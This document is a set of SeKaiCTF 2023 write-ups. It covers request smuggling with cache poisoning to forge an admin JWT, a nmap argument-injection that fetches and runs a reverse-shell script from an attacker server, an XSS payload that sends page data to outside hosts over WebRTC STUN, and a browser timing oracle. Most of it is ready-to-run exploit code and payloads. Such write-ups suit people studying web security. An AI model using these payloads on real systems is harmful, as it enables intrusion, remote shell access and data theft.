# SeKaiCTF 2023

# Chunky

The HTTP server in use is Gunicorn, version 20.1.0, which has known HRS issues as reported [here](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/).

## Summary

The infrastructures include a web cache, a nginx proxy server, a gunicorn http server and the Flask application. The order in which I've introduced these components also reflects the sequence in which a client request is processed.

**For the web cache,** the cache keys are http request method and request line. The request is forwarded to Nginx in its entirety, with a few exceptions.

1、The request headers of "Transfer-Encoding", "Expect" and "Forwarded" will be removed. However, this can be bypassed by altering the case of characters in these headers.

```go
// These are unsupported. Let's ignore them.
		headersToRemove := [5]string{"Transfer-Encoding", "Expect", "Forwarded"}
		for _, h := range headersToRemove {
			delete(headers, h)
		}
```

2、The request body will only be sent to nginx according to the length of the Content-Length header. The web cache will ignore the http body if there is no Content-Length header.

```bash
contentLength := headers["Content-Length"]

	if contentLength != "" {
		length := 0
		if _, err := fmt.Sscanf(contentLength, "%d", &length); err != nil {
			return "", nil, fmt.Errorf("invalid Content-Length header: %s", contentLength)
		}

		fmt.Printf("Body length: %d\n", length)

		body := make([]byte, length)
		_, err := io.ReadFull(reader, body)
		if err != nil {
			return "", nil, fmt.Errorf("error reading request body: %s", err.Error())
		}

		_, err = serverWriter.Write(body)
		if err != nil {
			return "", nil, fmt.Errorf("error sending request body: %s", err.Error())
		}
	}
```

**The Flask application** is just a blog website. Users can sign up their account and post something on the blog. There is a possible way to exploit XSS at the blog template in which the array of post is controllable by users.

```bash
# post.html

{{ post[0] | safe }}{{ post[1] }}
```

Most important, **the flag is served at the endpoint of ‘/admin/flag’.** To get it, an effective JWT token is necessary. In the JWT verification process, the application first get users’ JWK from the fixed endpoint ‘/{user_id}/.well-known/jwks.json’, and then use the JWK to verify the signature of users’ JWT. 

Our first step should be to replace our JWK with a controllable one, then sign the JWT with the private key we created. This process involves modifying the “user” value in the JWT to “admin”. Finally get the flag from the endpoint of `/admin/flag`.

## Exploitation guess

To that point, we can combine HTTP request smuggling and  HTTP cache poisoning attacks to cache the /{user_id}/.well-known/jwks.json’ with our self-crafted content.

However, I encountered challenges in implementing HRS on the target. I tried all the exploitation methods on the [blog above](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/), but it didn’t work.

```bash
$ echo -en "GET /admin/flag HTTP/1.1\r\nHost: chunky.chals.sekai.team:8080\r\nDummy: x\nContent-Length: 28\r\n\r\nGET /admin HTTP/1.1\r\nDummy: GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n" | nc chunky.chals.sekai.team 8080

echo -en "GET / HTTP/1.1\r\nHost: localhost:8080\r\nDummy: x\nContent-Length: 28\r\n\r\nGET /admin HTTP/1.1\r\nDummy: GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n" | nc chunky.chals.sekai.team 8080

```

Finally, find out how to solve this challenge.

- Approach 1: http 0.9 and file traversal

```bash
GET /{user_id}/.well-known/jwks.json ../../../../{user_id}/{post_id}

#Leveraging http/0.9 and file traversal. Do notice that the http response in HTTP 0.9 doesn't have http response header. So you need to craft http response header in your payloads.
```

- Approach 2: CL.TE HRS [https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00](https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00)

```bash
GET /just_random_cache_key HTTP/1.1
Host: localhost
Content-Length: 106
transfer-encoding: chunked

0

GET /post/63d71c38-8aac-4463-84df-93973029c93c/210bef4b-c993-4cb2-a7b9-1769ed3af21b HTTP/1.1
Dummy: GET /623d171c38-8aac-4463-84df-93973029c93c/.well-known/jwks.json HTTP/1.1
Host: localhost
(a blank line here)

```

To elaborate, the cache recognizes the end of the request body based solely on the Content-Length header, whereas Nginx and Gunicorn process the request body according to the Transfer-Encoding and disregard the Content-Length header, which leads to the rcache record two cache key **`GET /just_random_cache_key`** and **`/623d171c38-8aac-4463-84df-93973029c93c/.well-known/jwks.json`,** while nginx and gunicorn see the second request as the uri **`/post/63d71c38-8aac-4463-84df-93973029c93c/210bef4b-c993-4cb2-a7b9-1769ed3af21b`** different from what the rcache saw. Finally, this kind of discrepancy leads to HTTP request smuggling.

## Writeup 1

```bash
chunky without transfer-encoding chunked
cache poisoning by path traversal
GET /{user_id}/.well-known/jwks.json ../../../../{user_id}/{post_id}

import requests
import pwn
import os
import subprocess
import jwt
import random
import base64
import json

target = 'chunky.chals.sekai.team'

print('\n-----Register random user and login-----\n')

username = random.getrandbits(64)
print(f'Username: {username}')
password = random.getrandbits(64)
print(f'Password: {password}')

s = requests.session()
s.post(f'http://{target}:8080/signup', data = {
    'username': username,
    'password': password
})
s.post(f'http://{target}:8080/login', data = {
    'username': username,
    'password': password
})

print('\n-----Get user_id from session cookie-----\n')

user_id = json.loads(base64.b64decode(s.cookies['session'].split('.')[0] + '===').decode())['user_id']
print(f'user_id: {user_id}')

print('\n-----Generate JWT public and private key for JWKS-----\n')

# https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9

os.system("rm -f key key.pub && ssh-keygen -t rsa -b 4096 -m PEM -f key -q -N '' && openssl rsa -in key -pubout -outform PEM -out key.pub")
x5c = subprocess.check_output("sed '1d; $d;' ./key.pub | tr -d '\n'", shell=True).decode()

print('\n-----Create post with fake HTTP response containing our JWKS-----\n')

jwks_json = f'{{"keys":[{{"alg":"RS256","x5c":["{x5c}"]}}]}}'

r = s.post(f'http://{target}:8080/create_post', data = {
    'title': 'HTTP/1.1 200 OK' + '\r\n' + f'Content-Length: {len(jwks_json)}' + '\r\n\r\n' + jwks_json,
    'content': ' '
}, allow_redirects=False)

post_path = r.headers['Location']
print(f'Post created at {post_path}')

print(f'\n-----Cache poison /{user_id}/.well-known/jwks.json-----\n')

r = pwn.remote(target, 8080)
payload = f'GET /{user_id}/.well-known/jwks.json ../../../..{post_path}'
r.send(payload.encode() + b'\r\n')
r.close()

print('\n-----Get flag-----\n')

encoded = jwt.encode({'user': 'admin'}, open('key', 'r').read(), algorithm="RS256")

r = s.get(f'http://{target}:8080/admin/flag', headers = {
    'Authorization': f'Bearer {encoded}'
})
print(r.text)
```

## Writeup 2

chunked

```bash
import socket
import requests
import json
url = "http://localhost:8080"
s = requests.Session()
s.get(url)
user = {"username": "somer1234cs" , "password" : "asdf123ed"}
s.post(url+"/signup",data = user)
s.post(url+"/login",data=user)

key = {
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCkuU6E051FayM7hJ4RPDE7ahZG\nm4UTbILFpLjd1r6OU3L9+mkgp+OyNc9OgMFCzxK4yuMw9UPZX/0CVPciVKzjVQ+n\naj3AQqU8/pStES3ffQ3dX5Gtl45pMtexVcWx6pjSdhWpoE98v4ZdGcmt28NXpbRH\neZQxam+j/6xgBPh/3wIDAQAB"
            ]
        }
    ]
}
payload = 'HTTP/1.1 200 OK\nHost: localhost\n\r\n'+json.dumps(key)
post = {"title": payload,"content" : ""}
r= s.post(url+"/create_post", data=post, allow_redirects=False)
post = r.headers["location"]
user_id = post.split('/')[2]

server_address = ('localhost', 8080)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect(server_address)

smuggle = "GET {}\r\nHost: localhost\r\n\r\n".format(post)

http_request = """GET /post/asdf/f8badae4-0ff2-4fe8-ac15-3fc2d5b704c0 HTTP/1.1
Host: localhost
"""
http_request+="Content-Length: {}\n".format(14+len(smuggle))
	http_request+="transfer-encoding: chunked\n"
http_request+='\r\n'
http_request+="4\r\na=bs\r\n0\r\n\r\n"+smuggle
http_request+=f"""GET /{user_id}/.well-known/jwks.json HTTP/1.1
Host: localhost
"""
http_request+='\r\n'

print(http_request)

client_socket.send(http_request.encode())

response = client_socket.recv(2048)
print(response.decode())

client_socket.close()

b =requests.get(url+f"/{user_id}/.well-known/jwks.json")
headers = {"Authorization" : "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.bLHThpy3ZL1uIJNarMluJgOwkn79CS-_6GHecDByxe_Fl-Z1-y5U4fcsGgRLRBU5PVWQCefpzjtm1Kdc4dgxWbsO0lpCHwdm5Qeaqhe6eLxiBpQH_Un0OSMY2SHhjmiXlNFSDyDgpXUSemGnTnQR47K_V9h50cM8_IIx1Lbzs4w"}
print(s.get(url+"/admin/flag", headers=headers).text)
```

# **Scanner Service**

This challenge involves command injection and Nmap script exploitation. It features a Ruby web application that obtains `IP:PORT` from user input and then passes it to the Nmap command `nmap -p PORT(controllable point) IP`. 

Additionally, the application implements a filter for user input, escaping special characters, including: 

```bash
space, $ ` " \ | & ; < > ( ) ' \n *
```

Typically, injecting new Bash commands is challenging due to the strict filter. However, we can use `%09` (tab character) to replace spaces and inject new parameters, so that leveraging nmap script making it possible to execute arbitrary commands. This requires two steps:

1、Launch a http server at your remote server, just using the command `php -S 0.0.0.0:80` , and serve a reverse shell NSE script in the root directory of the PHP HTTP server you've just set up. For the reverse shell nse script, you can download from [here](https://github.com/SurajDadral/nmap-reverse-shell/blob/main/reverse_shell.nse).

2、Use the [http-fetch script](https://nmap.org/nsedoc/scripts/http-fetch.html) to download malicious nse script from our remote server. In this example, the nse script will be saved in the directory of `/tmp/OUR_REMOTE_SERVER_IP/PORT/` at the vulnerable server. The tips from the project [gtfobins](https://gtfobins.github.io/gtfobins/nmap/).

```bash
nmap -p 80 --script http-fetch --script-args http-fetch.destination=/tmp/,http-fetch.url=reverse_shell.nse YOUR_REMOTE_SERVER_IP
```

The actual payload is:

```bash
POST / HTTP/1.1

service=OUR_REMOTE_SERVER_IP%3A80%09--script%09http-fetch%09--script-args%09http-fetch.destination%3D/tmp/%2Chttp-fetch.url%3D/reverse_shell.nse
```

![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-82301c0270ea6c64b96b2f2de0690be4.png)

3、Execute the script just downloaded at the target server to get a shell.

```bash
# On your remote server
nc -nvlp 8080

#
nmap -p 80 --script=/tmp/OUR_REMOTE_SERVER_IP/80/reverse_shell.nse OUR_REMOTE_SERVER_IP

# actual payload
POST / HTTP/1.1

service=OUR_REMOTE_SERVER_IP%3A80%09--script%3D%2Ftmp/OUR_REMOTE_SERVER_IP%2F80%2Freverse_shell.nse
```

![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-6b7bc474c7d9c1a6699772907b4da1df.png)

![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-eef5239ef6d2d0d00478dd582b853d60.png)

## Solution 2:

```bash
--script http-enum --script-args-file /flag-????????????????????????????????.txt -vvvvvv -dddddd
```

![Untitled](https://api.2h0ng.wiki:443/noteimages/2024/01/21/18-10-39-0b2ca9c338d8ad07eb150f9645f8be9e.png)

# Golf-jail

[https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/](https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/)

```bash
Golf-jail: tiny xss + webrtc

https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=eval(%60%27%60%2bbaseURI)%3E#';eval(decodeURIComponent('pc%20=%20new%20RTCPeerConnection({%22iceServers%22:[{%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72, 8)+%22.%22+%22troll196.messwithdns.com%22]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=%3Epc.setLocalDescription(o));'))

https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=eval(%60%27%60%2bbaseURI)%3E#';eval(decodeURIComponent('pc%20=%20new%20RTCPeerConnection({%22iceServers%22:[{%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72,%208)+%22.%22+%22bwbgc97xua0ki7t5srhm1w1mldr4fy3n.oastify.com%22]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=%3Epc.setLocalDescription(o));'))

https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=eval(%60%27%60%2bbaseURI)%3E#';eval(decodeURIComponent('pc%20=%20new%20RTCPeerConnection({%22iceServers%22:[{%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72, 8)+%22.%22+%2272b67c6a53.ipv6.1433.eu.org.%22]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=%3Epc.setLocalDescription(o));'))
```

# leakless note

```bash
ts a timing attack, but not on the network which is crazy
im pretty sure it has to do with site isolation

// leakless note oracle
const oracle = async (w, href) => {
    const runs = [];
    for (let i = 0; i < 8; i++) {
        const samples = [];
        for (let j = 0; j < 600; j++) {
            const b = new Uint8Array(1e6);
            const t = performance.now();
            w.frames[0].postMessage(b, "*", [b.buffer]);
            samples.push(performance.now() - t);
            delete b;
        }
        runs.push(samples.reduce((a,b)=>a+b, 0));
        w.location = href;
        await sleep(500); // rate limit
        await waitFor(w);
    }
    runs.sort((a,b) => a-b);
    return {
        median: median(runs.slice(2, -2)),
        sum: runs.slice(2, -2).reduce((a,b)=>a+b,0),
        runs
    }
}
oracle: use large uint8arrays as transferrables over postMessage, for some reason the timing is different on chrome error page than not
```